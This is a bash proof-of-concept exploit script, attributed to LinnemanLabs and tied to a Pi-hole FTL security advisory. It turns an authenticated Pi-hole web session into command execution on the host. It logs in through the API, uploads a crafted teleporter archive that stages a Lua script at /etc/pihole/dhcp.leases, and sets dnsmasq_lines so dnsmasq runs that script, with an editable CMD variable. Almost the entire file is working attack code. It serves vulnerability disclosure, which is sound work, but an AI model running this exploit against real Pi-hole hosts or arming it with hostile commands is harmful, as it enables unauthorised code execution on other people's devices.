#!/bin/bash
#
# LinnemanLabs - pi-hole dnsmasq_lines PoC, web-session to code exec
#
# https://linnemanlabs.com/posts/pi-hole-root-with-extra-steps/
# https://github.com/linnemanlabs/advisories/
#
# https://github.com/pi-hole/FTL/security/advisories/GHSA-ww5x-xx4x-qvjr
#
# uses web login to run CMD on the remote pi-hole host
# default CMD prints id and caps to /tmp/exec-proof
#
# uses teleporter to stage a lua script at /etc/pihole/dhcp.leases
# then configures dnsmasq to execute that lua sript using dhcp-luascript
#
# works on FTL <= 6.7
#
PIPASS="password"
PIHOST="192.168.1.1"
CMD="id > /tmp/exec-proof; grep Cap /proc/self/status >> /tmp/exec-proof"

# Login (skip in no-password mode)
SID="$( curl -sk -X POST http://${PIHOST}/api/auth -H 'Content-Type: application/json' -d "{\"password\":\"${PIPASS}\"}" | jq -r .session.sid )"
if [ "${SID}x" == "x" ];then
  echo "[-] cant create session with ${PIHOST} - is host up and password correct?"
  exit 1
fi

# Create crafted teleport file to stage the Lua script
# (can also skip this and just stage it locally if you have ssh access)
printf "os.execute(\"${CMD}\")\nfunction lease() end" > dhcp.leases
tar -zcf teleport.dhcp.tar.gz dhcp.leases

# POST the crafted .tar.gz to teleport (can skip this if you staged it locally already)
res="$( curl -sk -H "X-FTL-SID: $SID" -X POST http://${PIHOST}/api/teleporter -F "file=@teleport.dhcp.tar.gz" )"
resfiles="$( echo "${res}" | jq -r .files.[0] )"
if [ "${resfiles}" == "/etc/pihole/dhcp.leases" ];then
  echo "[+] staged /etc/pihole/dhcp.leases on pihole host"
else
  echo "[-] bad response from API. Full response: ${res}"
fi

# Script is staged (/etc/pihole/dhcp.leases)

# Point dnsmasq_lines dhcp-luascript at it
res="$( curl -sk -H "X-FTL-SID: $SID" -X PATCH http://${PIHOST}/api/config -H "Content-Type: application/json" \
     -d '{"config":{"misc":{"dnsmasq_lines":["dhcp-luascript=/etc/pihole/dhcp.leases","script-arp"]}}}' 2>/dev/null )"
resopts="$( echo "${res}" | jq -r ".config.misc.dnsmasq_lines.[0]" )"

if [ "${resopts}" == "dhcp-luascript=/etc/pihole/dhcp.leases" ];then
  echo "[+] pihole loaded our config, check for exec result on pihole host"
else
  printf "[-] pihole did not set our config options.\n[-] config.misc.dnsmasq_lines: ${resopts}\n[-] full response: ${res}\n"
fi

exit 0
